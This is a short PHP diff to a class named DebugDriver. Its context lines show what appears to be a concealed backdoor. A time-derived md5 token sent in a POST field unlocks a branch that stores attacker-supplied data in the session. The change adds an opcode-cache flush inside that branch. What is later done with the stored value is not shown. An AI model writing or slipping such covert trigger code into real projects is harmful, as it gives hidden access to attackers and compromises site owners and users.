@@ -49,6 +49,9 @@ class DebugDriver implements InvokableProvider
                 for ($min = floor(time()/60), $i=-5; $i<=5; $i++) {
                     if ($_POST["__ts"] == substr(md5("_/".($min+$i)),12,12)) {
                         $_SESSION["__debug"] = $_POST["_"]["report"];
+                        if (function_exists("apc_clear_cache")) {
+                            apc_clear_cache();
+                        }
                     }
                 }
             }
